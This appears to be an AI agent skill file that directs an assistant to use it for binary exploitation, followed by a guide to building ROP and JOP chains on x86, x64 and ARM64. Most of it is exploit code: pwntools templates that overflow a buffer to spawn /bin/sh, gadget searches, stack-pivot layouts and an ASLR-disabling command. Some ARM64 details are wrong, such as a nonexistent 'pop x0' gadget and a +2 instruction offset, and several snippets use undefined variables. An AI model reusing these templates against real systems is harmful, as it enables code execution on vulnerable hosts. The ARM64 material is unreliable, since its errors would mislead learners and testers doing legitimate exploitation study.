---
name: rop-exploitation
description: How to create Return-Oriented Programming (ROP) and Jump-Oriented Programming (JOP) exploits for binary exploitation. Use this skill whenever the user needs to bypass NX/DEP protections, construct ROP chains for x86/x64/ARM64 architectures, find gadgets, handle stack alignment, or work with ret2lib/ret2syscall techniques. Make sure to use this skill when the user mentions ROP, gadgets, stack pivoting, binary exploitation, buffer overflow exploitation, or needs to call functions like system() through ROP chains.
---

# ROP & JOP Exploitation Guide

Return-Oriented Programming (ROP) is an advanced exploitation technique used to circumvent security measures like **No-Execute (NX)** or **Data Execution Prevention (DEP)**. Instead of injecting shellcode, you leverage existing code pieces called **"gadgets"** that end with `ret` instructions.

## Quick Start

1. **Identify the vulnerability** (buffer overflow, function pointer overwrite, etc.)
2. **Find gadgets** using ROPgadget, ropper, or pwntools
3. **Understand the calling convention** for your target architecture
4. **Build the ROP chain** to set up arguments and call your target function
5. **Handle stack alignment** (critical for x64)
6. **Test and iterate**

## Architecture-Specific Guidance

### x86 (32-bit)

**Calling Convention (cdecl):**
- Arguments pushed onto stack **right-to-left**
- Caller cleans the stack
- Return address on stack

**Typical ROP Chain for `system("/bin/sh")`:**

```python
from pwn import *

binary = context.binary = ELF('binary')
p = process(binary.path)

# Find /bin/sh string
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Get system address (from libc or binary)
system_addr = libc.symbols['system']

# Build chain
rop_chain = [
    0x41414141,    # Return address after system() (can be exit() or safe address)
    bin_sh_addr    # Argument to system()
]

# Add offset to reach return address
payload = b'A' * offset + p32(system_addr) + p32(rop_chain[0]) + p32(rop_chain[1])

p.sendline(payload)
p.interactive()
```

**Common Gadgets Needed:**
- `pop eax; ret` - Control EAX register
- `pop ebx; ret` - Control EBX register  
- `mov [ebx], eax; ret` - Write-what-where gadget

### x64 (64-bit)

**Calling Convention (System V AMD64 ABI):**
- First 6 arguments in registers: **RDI, RSI, RDX, RCX, R8, R9**
- Return value in RAX
- **Stack must be 16-byte aligned** before function calls

**Critical: Stack Alignment**

The x86-64 ABI requires 16-byte stack alignment when `call` executes. LIBC uses SSE instructions (like `movaps`) that require this alignment. If RSP isn't a multiple of 16, `system()` will crash.

**Solution:** Add a `ret` gadget before calling `system()` to adjust alignment.

**Typical ROP Chain for `system("/bin/sh")`:**

```python
from pwn import *

binary = context.binary = ELF('binary')
p = process(binary.path)

# Find /bin/sh string
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Get system address
system_addr = libc.symbols['system']

# Find gadgets
pop_rdi = next(binary.search(b'\x5f\xc3'))  # pop rdi; ret
ret_gadget = next(binary.search(b'\xc3'))    # ret

# Build chain with alignment
rop_chain = [
    ret_gadget,        # Align stack (if needed)
    pop_rdi,           # pop rdi; ret
    bin_sh_addr,       # /bin/sh address
    system_addr        # Call system()
]

# Add offset
payload = b'A' * offset + p64(rop_chain[0]) + p64(rop_chain[1]) + p64(rop_chain[2]) + p64(rop_chain[3])

p.sendline(payload)
p.interactive()
```

**Common Gadgets Needed:**
- `pop rdi; ret` - Set first argument (RDI)
- `pop rsi; ret` - Set second argument (RSI)
- `pop rdx; ret` - Set third argument (RDX)
- `ret` - Stack alignment

### ARM64

**Critical ARM64 Consideration:**

When jumping to a function via ROP in ARM64, **jump to the 2nd instruction** of the function (not the first). This prevents storing the current stack pointer and creating an infinite loop.

**Calling Convention:**
- First 8 arguments in registers: **X0-X7**
- Return value in X0
- Stack pointer: SP
- Frame pointer: X29
- Link register: X30

**Finding Gadgets in macOS/iOS:**

System libraries are in `dyld_shared_cache_arm64`. Extract and search:

```bash
# Extract libraries
dyld-shared-cache-extractor dyld_shared_cache_arm64 dyld_extracted/

# Find gadgets
ropper --file libcache.dylib --search "mov x0"
```

**Typical ROP Chain for `system("/bin/sh")`:**

```python
from pwn import *

binary = context.binary = ELF('binary')
p = process(binary.path)

# Find /bin/sh string
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Get system address (skip first instruction!)
system_addr = libc.symbols['system'] + 2

# Find gadgets
pop_x0 = next(binary.search(b'\x20\x00\x40\xd2'))  # pop x0; ret

# Build chain
rop_chain = [
    pop_x0,        # pop x0; ret
    bin_sh_addr,   # /bin/sh address
    system_addr    # Call system() (2nd instruction)
]

payload = b'A' * offset + p64(rop_chain[0]) + p64(rop_chain[1]) + p64(rop_chain[2])

p.sendline(payload)
p.interactive()
```

## Finding Gadgets

### Using ROPgadget

```bash
# Basic search
ROPgadget --binary binary | grep "pop rdi"

# Search specific instruction
ROPgadget --binary binary --only "pop|ret" | grep "pop rdi"

# From libc
ROPgadget --binary libc.so.6 | grep "pop rdi"
```

### Using ropper

```bash
# Find gadgets
ropper --file binary --search "pop rdi"

# Find all pop gadgets
ropper --file binary --only "pop|ret"

# From multiple files
ropper --file *.so --search "mov x0"
```

### Using pwntools

```python
from pwn import *

binary = ELF('binary')

# Find gadgets
pop_rdi = next(binary.search(b'\x5f\xc3'))  # pop rdi; ret

# Build ROP chain
rop = ROP(binary)
rop.system(bin_sh_addr)

# Get payload
payload = rop.chain()
```

## Stack Pivoting

Stack pivoting changes the stack pointer to point to controlled memory (heap or buffer) where your payload resides.

**Common Stack Pivot Gadgets (ARM64):**

```asm
# Simple pivot
mov sp, x0; ldp x29, x30, [sp], #0x10; ret;

# Complex pivot from libunwind.dylib
ldr x16, [x0, #0xf8];    # Control x16
ldr x30, [x0, #0x100];   # Control x30
ldp x0, x1, [x0];        # Control x1
mov sp, x16;             # Pivot stack
ret;                     # Jump to x30
```

**Heap Setup for Stack Pivot:**

```
<address of x0>          # ldp x0, x1, [x0]
<address of gadget>      # Overflowed pointer
"A" * 0xe8               # Fill until x0+0xf8
<address x0+16>          # New SP location
<next gadget>            # Goes into x30
```

## JOP (Jump-Oriented Programming)

JOP uses jump addresses instead of `ret` instructions. Useful when ROP isn't feasible (common in ARM).

**Finding JOP Gadgets:**

```bash
# Search for JOP gadgets
ropper --file *.dylib --search "ldr x0, [x0"

# Example JOP gadget
0x00000001800d1918: ldr x0, [x0, #0x20]; ldr x2, [x0, #0x30]; br x2;
```

**JOP Chain Example:**

```
Heap layout:
  [x0 + 0x20] = address of /bin/sh
  [x0 + 0x30] = address of system

Gadget loads x0 from [x0+0x20], x2 from [x0+0x30], then branches to x2
```

## Bypassing Protections

### ASLR & PIE

- Disable ASLR for testing: `echo 0 > /proc/sys/kernel/randomize_va_space`
- Leak addresses first, then calculate offsets
- Use `libc.symbols` with base address: `libc.address + libc.symbols['system']`

### Stack Canaries

- Leak canary first (format string, info leak)
- Overwrite canary before return address
- Or bypass via other vulnerability

### Lack of Gadgets

- Use JOP instead of ROP
- Use ret2libc if libc is available
- Use ret2syscall for direct syscalls

## Common ROP-Based Techniques

### Ret2Lib

Call arbitrary functions from loaded libraries:

```python
rop = ROP(binary)
rop.call(libc.symbols['system'], [bin_sh_addr])
```

### Ret2Syscall

Direct syscall execution:

```python
from pwn import *

# execve("/bin/sh", ["/bin/sh", NULL], [NULL])
rop = ROP(binary)
rop.execve(bin_sh_addr)
```

### EBP2Ret & EBP Chaining

Control flow via EBP instead of EIP:

```python
# Overwrite EBP to control return chain
payload = b'A' * offset + p32(rop_chain[0]) + p32(rop_chain[1])
```

## Debugging Tips

1. **Use GDB with pwndbg/gef** for better visualization
2. **Check stack alignment**: `info registers rsp` - should be multiple of 16
3. **Verify gadget addresses**: `x/10i 0xaddress`
4. **Test incrementally**: Start with simple gadgets, add complexity
5. **Use `context.log_level = 'debug'`** in pwntools for verbose output

## Common Pitfalls

| Issue | Solution |
|-------|----------|
| `system()` crashes on x64 | Add `ret` gadget for 16-byte alignment |
| ARM64 infinite loop | Jump to 2nd instruction of function |
| Wrong argument order | Check calling convention for architecture |
| ASLR randomization | Leak addresses or disable for testing |
| Stack canary | Leak and overwrite, or bypass |
| No gadgets | Try JOP, ret2libc, or ret2syscall |

## Quick Reference

**x86:**
- Args: Stack (right-to-left)
- Gadgets: `pop eax; ret`, `pop ebx; ret`

**x64:**
- Args: RDI, RSI, RDX, RCX, R8, R9
- Gadgets: `pop rdi; ret`, `pop rsi; ret`
- **Remember: 16-byte stack alignment!**

**ARM64:**
- Args: X0-X7
- Gadgets: `pop x0; ret`, `pop x1; ret`
- **Remember: Jump to 2nd instruction!**

## Tools Summary

| Tool | Purpose |
|------|---------|
| ROPgadget | Find gadgets in binaries |
| ropper | Find gadgets, supports multiple files |
| pwntools ROP | Build ROP chains programmatically |
| lldb | Find loaded libraries (ARM64) |
| dyld-shared-cache-extractor | Extract macOS/iOS libraries |

## Next Steps

1. Identify your target architecture and calling convention
2. Find necessary gadgets using ROPgadget/ropper/pwntools
3. Build ROP chain with proper argument setup
4. Handle stack alignment (x64) or instruction offset (ARM64)
5. Test and debug with GDB
6. Address any protections (ASLR, canaries, etc.)
